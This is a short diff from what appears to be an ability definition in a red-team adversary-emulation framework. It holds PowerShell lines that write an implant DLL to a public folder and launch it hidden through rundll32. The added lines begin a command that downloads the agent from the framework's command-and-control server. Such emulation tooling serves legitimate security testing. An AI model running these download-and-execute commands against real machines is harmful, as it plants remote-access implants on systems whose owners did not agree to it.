@@ -191,6 +191,7 @@
               [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.dll",$data) | Out-Null;
               Start-Process -FilePath C:\Windows\System32\rundll32.exe -ArgumentList "C:\Users\Public\#{agents.implant_name}.dll,VoidFunc" -WindowStyle hidden;
           - description: Deploy as a Windows DLL that will run the agent when loaded. Saves the DLL to disk and loads it using PowerShell P/Invoke.
+            command: |
               $server="#{app.contact.http}";
               $url="$server/file/download";
               $wc=New-Object System.Net.WebClient;
